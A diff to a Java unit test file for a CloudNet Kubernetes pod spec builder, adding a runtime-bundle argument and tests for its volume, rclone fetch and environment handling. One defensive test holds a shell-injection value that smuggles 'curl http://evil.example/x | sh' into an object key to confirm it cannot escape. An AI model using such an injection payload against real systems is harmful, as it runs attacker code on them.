@@ -28,8 +28,8 @@ class PodSpecBuilderTest {
     this.request = new PodSpecBuilder.PodRequest(
       "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
       "cloudnet-node-node-1-owner", "6f1c9f0e-1111-2222-3333-444455556666",
-      null, "services/cn-lobby-1-a3f9c2e1.tar",
-      List.of("java", "-Xmx4096M", "-cp", "/cloudnet/libs/*", "Main"));
+      null, "services/cn-lobby-1-a3f9c2e1.tar", "runtime/0f3a9c.tar",
+      List.of("java", "-Xmx4096M", "-cp", "/cloudnet/runtime/libs/*", "Main"));
   }
 
   @Test
@@ -113,7 +113,7 @@ class PodSpecBuilderTest {
   void perTaskImageOverridesTheModuleDefault() {
     var overridden = new PodSpecBuilder.PodRequest(
       "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
-      "owner", "uid", "ghcr.io/example/custom:1.0", "services/x.tar", List.of("java"));
+      "owner", "uid", "ghcr.io/example/custom:1.0", "services/x.tar", "runtime/x.tar", List.of("java"));
 
     assertEquals("ghcr.io/example/custom:1.0",
       this.builder.build(overridden).getSpec().getContainers().getFirst().getImage());
@@ -158,7 +158,7 @@ class PodSpecBuilderTest {
   void shellMetacharactersInTheObjectKeyCannotEscapeIntoTheScript() {
     var malicious = new PodSpecBuilder.PodRequest(
       "Lobby-1", ID, "lobby", 4096, 25565, "node-1", "owner", "uid", null,
-      "services/x.tar\"; curl http://evil.example/x | sh; #",
+      "services/x.tar\"; curl http://evil.example/x | sh; #", "runtime/x.tar",
       List.of("java"));
 
     var init = this.builder.build(malicious).getSpec().getInitContainers().getFirst();
@@ -332,11 +332,44 @@ class PodSpecBuilderTest {
   void taskLabelWithIllegalCharactersIsSanitisedToAValidLabelValue() {
     var withTask = new PodSpecBuilder.PodRequest(
       "Lobby-1", ID, "Lobby #1", 4096, 25565, "node-1",
-      "owner", "uid", null, "services/x.tar", List.of("java"));
+      "owner", "uid", null, "services/x.tar", "runtime/x.tar", List.of("java"));
 
     var label = this.builder.build(withTask).getMetadata().getLabels().get("cloudnet.eu/task");
 
     assertEquals("Lobby--1", label);
+  }
+
+  @Test
+  void runtimeBundleIsAnEmptyDirMountedIntoTheInitContainerAndTheServer() {
+    var spec = this.builder.build(this.request).getSpec();
+
+    var volume = spec.getVolumes().stream()
+      .filter(v -> v.getName().equals("runtime"))
+      .findFirst().orElseThrow(() -> new AssertionError("no runtime volume"));
+    assertNotNull(volume.getEmptyDir(), "the runtime is unpacked per pod, never shared");
+    assertTrue(spec.getInitContainers().getFirst().getVolumeMounts().stream()
+      .anyMatch(m -> m.getName().equals("runtime") && m.getMountPath().equals("/cloudnet/runtime")));
+    assertTrue(spec.getContainers().getFirst().getVolumeMounts().stream()
+      .anyMatch(m -> m.getName().equals("runtime") && m.getMountPath().equals("/cloudnet/runtime")));
+  }
+
+  @Test
+  void initContainerFetchesTheRuntimeBundleAsWellAsTheServiceDirectory() {
+    var script = String.join(" ", this.builder.build(this.request).getSpec()
+      .getInitContainers().getFirst().getCommand());
+
+    assertTrue(script.contains("rclone copyto \"staging:$S3_BUCKET/$S3_RUNTIME_KEY\" /tmp/runtime.tar"), script);
+    assertTrue(script.contains("tar -xf /tmp/runtime.tar -C /cloudnet/runtime"), script);
+    assertTrue(script.contains("rm -f /tmp/runtime.tar"), script);
+  }
+
+  @Test
+  void runtimeKeyTravelsInTheEnvironmentNotInTheShellScript() {
+    var pod = this.builder.build(this.request);
+
+    assertFalse(String.join(" ", pod.getSpec().getInitContainers().getFirst().getCommand())
+      .contains("runtime/0f3a9c.tar"));
+    assertEquals("runtime/0f3a9c.tar", envOf(pod).get("S3_RUNTIME_KEY"));
   }
 
   @Test
@@ -361,7 +394,7 @@ class PodSpecBuilderTest {
   ) {
     return new PodSpecBuilder.PodRequest(
       "Lobby-1", ID, "lobby", 4096, 25565, "node-1",
-      "owner", "uid", null, "services/x.tar", List.of("java"),
+      "owner", "uid", null, "services/x.tar", "runtime/x.tar", List.of("java"),
       nodeSelector, tolerationKey, cpuRequest, memoryMiB, priorityClassName);
   }
 }
